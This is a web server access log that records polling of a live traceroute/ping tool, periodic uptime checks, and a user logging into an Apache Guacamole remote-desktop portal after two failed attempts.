129.55.200.27 - - [18/Dec/2023:17:06:33 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5749 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:34 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5750 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:35 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5751 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:36 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5752 "livetrace@docker" "http://172.18.0.3:80" 4ms
167.71.120.76 - - [18/Dec/2023:17:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5753 "www@docker" "http://172.18.0.9:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:37 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 120 "-" "-" 5754 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:38 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 622 "-" "-" 5755 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:39 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 622 "-" "-" 5756 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:40 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 622 "-" "-" 5757 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:41 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 653 "-" "-" 5758 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:42 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 653 "-" "-" 5759 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:43 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 653 "-" "-" 5760 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:44 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 684 "-" "-" 5761 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:45 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 684 "-" "-" 5762 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:46 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 684 "-" "-" 5763 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:47 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 715 "-" "-" 5764 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:48 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 715 "-" "-" 5765 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:49 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 715 "-" "-" 5766 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:50 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 746 "-" "-" 5767 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:51 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 746 "-" "-" 5768 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:52 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 746 "-" "-" 5769 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:53 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 777 "-" "-" 5770 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:54 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 777 "-" "-" 5771 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:55 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 777 "-" "-" 5772 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:56 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 808 "-" "-" 5773 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:06:57 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 808 "-" "-" 5774 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:58 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 808 "-" "-" 5775 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:06:59 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 839 "-" "-" 5776 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:00 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 839 "-" "-" 5777 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:01 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 839 "-" "-" 5778 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:02 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 870 "-" "-" 5779 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:03 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 870 "-" "-" 5780 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:04 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 870 "-" "-" 5781 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:05 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 901 "-" "-" 5782 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:06 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 901 "-" "-" 5783 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:07 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 901 "-" "-" 5784 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:08 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 932 "-" "-" 5785 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:09 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 932 "-" "-" 5786 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:10 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 932 "-" "-" 5787 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:11 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 963 "-" "-" 5788 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:12 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 963 "-" "-" 5789 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:13 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 963 "-" "-" 5790 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:14 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 994 "-" "-" 5791 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:15 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 994 "-" "-" 5792 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:16 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 994 "-" "-" 5793 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:17 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1025 "-" "-" 5794 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:18 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1025 "-" "-" 5795 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:19 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1025 "-" "-" 5796 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:20 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1056 "-" "-" 5797 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:21 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1056 "-" "-" 5798 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:22 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1056 "-" "-" 5799 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:17:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5800 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.27 - - [18/Dec/2023:17:07:23 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1087 "-" "-" 5801 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:24 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1087 "-" "-" 5802 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:25 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1087 "-" "-" 5803 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:26 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1118 "-" "-" 5804 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:27 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1118 "-" "-" 5805 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:28 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1118 "-" "-" 5806 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:29 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1149 "-" "-" 5807 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:30 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1149 "-" "-" 5808 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:31 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1149 "-" "-" 5809 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:32 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1180 "-" "-" 5810 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:33 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1180 "-" "-" 5811 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:34 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1180 "-" "-" 5812 "livetrace@docker" "http://172.18.0.3:80" 2ms
129.55.200.27 - - [18/Dec/2023:17:07:35 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1211 "-" "-" 5813 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:36 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1211 "-" "-" 5814 "livetrace@docker" "http://172.18.0.3:80" 3ms
167.71.120.76 - - [18/Dec/2023:17:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5815 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.27 - - [18/Dec/2023:17:07:37 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1211 "-" "-" 5816 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:38 +0000] "GET /trace/polltrace.php?id=oh23ciahy HTTP/2.0" 200 1262 "-" "-" 5817 "livetrace@docker" "http://172.18.0.3:80" 1ms
129.55.200.27 - - [18/Dec/2023:17:07:38 +0000] "GET /trace/cleantrace.php?id=oh23ciahy HTTP/2.0" 200 72 "-" "-" 5818 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:07:54 +0000] "GET /trace/ HTTP/2.0" 200 6047 "-" "-" 5819 "livetrace@docker" "http://172.18.0.3:80" 18ms
89.187.178.158 - - [18/Dec/2023:17:07:59 +0000] "GET /trace/startping.php?id=tmomvcvjv HTTP/2.0" 200 105 "-" "-" 5820 "livetrace@docker" "http://172.18.0.3:80" 4ms
89.187.178.158 - - [18/Dec/2023:17:08:00 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 31 "-" "-" 5821 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:01 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 54 "-" "-" 5822 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:02 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 75 "-" "-" 5823 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:03 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 99 "-" "-" 5824 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:08:04 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 123 "-" "-" 5825 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:05 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 146 "-" "-" 5826 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:08:06 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 169 "-" "-" 5827 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:08:07 +0000] "GET /trace/pollping.php?id=tmomvcvjv HTTP/2.0" 200 190 "-" "-" 5828 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:08:07 +0000] "GET /trace/cleanping.php?id=tmomvcvjv HTTP/2.0" 200 71 "-" "-" 5829 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:08:13 +0000] "GET /trace/starttrace.php?id=hjqkmu1zu HTTP/2.0" 200 106 "-" "-" 5830 "livetrace@docker" "http://172.18.0.3:80" 3ms
89.187.178.158 - - [18/Dec/2023:17:08:14 +0000] "GET /trace/polltrace.php?id=hjqkmu1zu HTTP/2.0" 200 67 "-" "-" 5831 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:15 +0000] "GET /trace/polltrace.php?id=hjqkmu1zu HTTP/2.0" 200 67 "-" "-" 5832 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:08:16 +0000] "GET /trace/polltrace.php?id=hjqkmu1zu HTTP/2.0" 200 67 "-" "-" 5833 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:17 +0000] "GET /trace/polltrace.php?id=hjqkmu1zu HTTP/2.0" 200 67 "-" "-" 5834 "livetrace@docker" "http://172.18.0.3:80" 2ms
89.187.178.158 - - [18/Dec/2023:17:08:18 +0000] "GET /trace/polltrace.php?id=hjqkmu1zu HTTP/2.0" 200 67 "-" "-" 5835 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:19 +0000] "GET /trace/polltrace.php?id=hjqkmu1zu HTTP/2.0" 200 67 "-" "-" 5836 "livetrace@docker" "http://172.18.0.3:80" 2ms
143.110.222.166 - - [18/Dec/2023:17:08:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 5837 "web-to-websecure@internal" "-" 0ms
89.187.178.158 - - [18/Dec/2023:17:08:20 +0000] "GET /trace/polltrace.php?id=hjqkmu1zu HTTP/2.0" 200 714 "-" "-" 5838 "livetrace@docker" "http://172.18.0.3:80" 1ms
89.187.178.158 - - [18/Dec/2023:17:08:20 +0000] "GET /trace/cleantrace.php?id=hjqkmu1zu HTTP/2.0" 200 72 "-" "-" 5839 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:17:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5840 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5841 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:17:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5842 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:17:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5843 "www@docker" "http://172.18.0.9:80" 0ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/ HTTP/2.0" 200 2811 "-" "-" 5844 "guacamole@docker" "http://172.18.0.10:8080" 187ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/datalist-polyfill.min.js HTTP/2.0" 200 7428 "-" "-" 5848 "guacamole@docker" "http://172.18.0.10:8080" 34ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/Blob.js HTTP/2.0" 200 20299 "-" "-" 5847 "guacamole@docker" "http://172.18.0.10:8080" 52ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/lodash.min.js HTTP/2.0" 200 73015 "-" "-" 5851 "guacamole@docker" "http://172.18.0.10:8080" 45ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/guacamole-common-js/all.min.js HTTP/2.0" 200 72454 "-" "-" 5849 "guacamole@docker" "http://172.18.0.10:8080" 60ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/templates.js HTTP/2.0" 200 97677 "-" "-" 5855 "guacamole@docker" "http://172.18.0.10:8080" 49ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/jquery.min.js HTTP/2.0" 200 89795 "-" "-" 5850 "guacamole@docker" "http://172.18.0.10:8080" 59ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/1.guacamole.7935cf403412cd79c600.js HTTP/2.0" 200 16587 "-" "-" 5853 "guacamole@docker" "http://172.18.0.10:8080" 64ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/angular.min.js HTTP/2.0" 200 177368 "-" "-" 5852 "guacamole@docker" "http://172.18.0.10:8080" 70ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/1.guacamole.1b135b054a2260e7b072.css HTTP/2.0" 200 79918 "-" "-" 5845 "guacamole@docker" "http://172.18.0.10:8080" 100ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 200 1987 "-" "-" 5846 "guacamole@docker" "http://172.18.0.10:8080" 94ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 200 6482 "-" "-" 5856 "guacamole@docker" "http://172.18.0.10:8080" 77ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/guacamole.c99aa30d916181eec243.js HTTP/2.0" 200 369103 "-" "-" 5854 "guacamole@docker" "http://172.18.0.10:8080" 104ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/images/logo-64.png HTTP/2.0" 200 5082 "-" "-" 5860 "guacamole@docker" "http://172.18.0.10:8080" 5ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 5859 "guacamole@docker" "http://172.18.0.10:8080" 193ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 5857 "guacamole@docker" "http://172.18.0.10:8080" 263ms
129.55.200.20 - - [18/Dec/2023:17:09:43 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 5861 "guacamole@docker" "http://172.18.0.10:8080" 7ms
129.55.200.20 - - [18/Dec/2023:17:09:42 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 257 "-" "-" 5858 "guacamole@docker" "http://172.18.0.10:8080" 914ms
129.55.200.20 - - [18/Dec/2023:17:09:43 +0000] "GET /guacamole/images/guac-tricolor.svg HTTP/2.0" 200 3788 "-" "-" 5862 "guacamole@docker" "http://172.18.0.10:8080" 4ms
129.55.200.20 - - [18/Dec/2023:17:09:43 +0000] "GET /guacamole/fonts/carlito/Carlito-Italic.woff HTTP/2.0" 200 283500 "-" "-" 5865 "guacamole@docker" "http://172.18.0.10:8080" 33ms
129.55.200.20 - - [18/Dec/2023:17:09:43 +0000] "GET /guacamole/fonts/carlito/Carlito-Bold.woff HTTP/2.0" 200 281212 "-" "-" 5864 "guacamole@docker" "http://172.18.0.10:8080" 43ms
129.55.200.20 - - [18/Dec/2023:17:09:43 +0000] "GET /guacamole/fonts/carlito/Carlito-Regular.woff HTTP/2.0" 200 269832 "-" "-" 5863 "guacamole@docker" "http://172.18.0.10:8080" 45ms
159.203.109.206 - - [18/Dec/2023:17:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5866 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5867 "www@docker" "http://172.18.0.9:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:10:46 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 261 "-" "-" 5868 "guacamole@docker" "http://172.18.0.10:8080" 167ms
129.55.200.20 - - [18/Dec/2023:17:10:48 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 5869 "guacamole@docker" "http://172.18.0.10:8080" 100ms
129.55.200.20 - - [18/Dec/2023:17:10:48 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 5871 "guacamole@docker" "http://172.18.0.10:8080" 17ms
129.55.200.20 - - [18/Dec/2023:17:10:48 +0000] "DELETE /guacamole/api/session HTTP/2.0" 403 192 "-" "-" 5870 "guacamole@docker" "http://172.18.0.10:8080" 20ms
129.55.200.20 - - [18/Dec/2023:17:10:48 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 5875 "guacamole@docker" "http://172.18.0.10:8080" 37ms
129.55.200.20 - - [18/Dec/2023:17:10:48 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 5873 "guacamole@docker" "http://172.18.0.10:8080" 45ms
129.55.200.20 - - [18/Dec/2023:17:10:48 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 5874 "guacamole@docker" "http://172.18.0.10:8080" 363ms
129.55.200.20 - - [18/Dec/2023:17:10:48 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 5872 "guacamole@docker" "http://172.18.0.10:8080" 389ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 5878 "guacamole@docker" "http://172.18.0.10:8080" 9ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/x.svg HTTP/2.0" 200 441 "-" "-" 5879 "guacamole@docker" "http://172.18.0.10:8080" 2ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/arrows/down.svg HTTP/2.0" 200 317 "-" "-" 5881 "guacamole@docker" "http://172.18.0.10:8080" 10ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/user-icons/guac-user.svg HTTP/2.0" 200 655 "-" "-" 5880 "guacamole@docker" "http://172.18.0.10:8080" 12ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/protocol-icons/guac-text.svg HTTP/2.0" 200 647 "-" "-" 5886 "guacamole@docker" "http://172.18.0.10:8080" 9ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/action-icons/guac-home-dark.svg HTTP/2.0" 200 505 "-" "-" 5882 "guacamole@docker" "http://172.18.0.10:8080" 14ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/action-icons/guac-logout-dark.svg HTTP/2.0" 200 1464 "-" "-" 5884 "guacamole@docker" "http://172.18.0.10:8080" 14ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/action-icons/guac-config-dark.svg HTTP/2.0" 200 840 "-" "-" 5883 "guacamole@docker" "http://172.18.0.10:8080" 16ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/magnifier.svg HTTP/2.0" 200 647 "-" "-" 5885 "guacamole@docker" "http://172.18.0.10:8080" 15ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/images/protocol-icons/guac-monitor.svg HTTP/2.0" 200 968 "-" "-" 5887 "guacamole@docker" "http://172.18.0.10:8080" 14ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 5876 "guacamole@docker" "http://172.18.0.10:8080" 167ms
129.55.200.20 - - [18/Dec/2023:17:10:49 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 5877 "guacamole@docker" "http://172.18.0.10:8080" 175ms
159.203.109.206 - - [18/Dec/2023:17:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5888 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:17:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 5889 "www@docker" "http://172.18.0.9:80" 1ms
129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "GET /guacamole/images/settings/tablet-keys.svg HTTP/2.0" 200 5525 "-" "-" 5893 "guacamole@docker" "http://172.18.0.10:8080" 10ms
129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "GET /guacamole/images/settings/touchscreen.svg HTTP/2.0" 200 5318 "-" "-" 5892 "guacamole@docker" "http://172.18.0.10:8080" 11ms
129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "GET /guacamole/images/settings/touchpad.svg HTTP/2.0" 200 7643 "-" "-" 5891 "guacamole@docker" "http://172.18.0.10:8080" 13ms
129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 5890 "guacamole@docker" "http://172.18.0.10:8080" 18ms
129.55.200.20 - - [18/Dec/2023:17:11:36 +0000] "GET /guacamole/images/drive.svg HTTP/2.0" 200 994 "-" "-" 5897 "guacamole@docker" "http://172.18.0.10:8080" 2ms
